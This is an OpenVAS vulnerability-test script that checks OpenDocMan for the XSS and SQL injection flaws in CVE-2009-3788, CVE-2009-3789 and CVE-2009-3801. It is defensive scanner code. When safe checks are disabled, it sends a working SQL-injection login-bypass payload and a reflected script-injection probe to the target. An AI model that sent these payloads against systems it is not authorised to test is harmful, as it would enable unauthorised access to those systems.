###############################################################################
# OpenVAS Vulnerability Test
#
# OpenDocMan Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900885");
  script_version("2019-05-14T12:12:41+0000");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2009-10-29 07:53:15 +0100 (Thu, 29 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-3788", "CVE-2009-3789", "CVE-2009-3801");
  script_bugtraq_id(36777);
  script_name("OpenDocMan Multiple XSS and SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/30750/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53886");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.org/0910-exploits/opendocman-sqlxss.txt");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_opendocman_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OpenDocMan/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause Cross-Site Scripting or
  SQL Injection attacks by executing arbitrary codes with in the context of the affected application.");

  script_tag(name:"affected", value:"OpenDocMan version prior to 1.2.5.2");

  script_tag(name:"insight", value:"- Input passed to the 'frmuser' and 'frmpass' parameters in 'index.php' is not
  properly sanitised before being used in SQL queries.

  - Input passed to the 'last_message' parameter in add.php, toBePublished.php,
  index.php, and admin.php, and input passed via the URL to category.php,
  department.php, profile.php, rejects.php, search.php, toBePublished.php,
  view_file.php, and user.php is not properly sanitised before being returned to the user.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to OpenDocMan version 1.2.5.2 or later.");

  script_tag(name:"summary", value:"This host is running OpenDocMan and is prone to multiple Cross-Site
  Scripting and SQL Injection vulnerabilities.");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

docmanPort = get_http_port(default:80);

docmanVer = get_kb_item("www/"+ docmanPort + "/OpenDocMan");
if(!docmanVer)
  exit(0);

docmanVer = eregmatch(pattern:"^(.+) under (/.*)$", string:docmanVer);
if(docmanVer[2] && !safe_checks())
{
  filename = string(docmanVer[2] + "/index.php");
  host = http_host_name(port:docmanPort);

  authVariables = "frmuser=admin' OR '1'='1&frmpass=&login=Enter";
  sndReq1 = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
  rcvRes1 = http_send_recv(port:docmanPort, data:sndReq1);
  if(egrep(pattern:"Location: out.php", string:rcvRes1))
  {
    security_message(port:docmanPort, data:"The target host was found to be vulnerable.");
    exit(0);
  }

  sndReq2 = http_get(item:string(docmanVer[2], "/index.php?last_message=" +
                          "<script>alert(1)</script>"), port:docmanPort);
  rcvRes2 = http_send_recv(port:docmanPort, data:sndReq2);
  if(rcvRes2 =~ "HTTP/1\.. 200" && "<script>alert(1)</script><" >< rcvRes2)
  {
    security_message(port:docmanPort, data:"The target host was found to be vulnerable.");
    exit(0);
  }
}

if(docmanVer[1])
{
  if(version_is_less(version:docmanVer[1], test_version:"1.2.5.2")){
    security_message(port:docmanPort, data:"The target host was found to be vulnerable.");
    exit(0);
  }
}

exit(99);
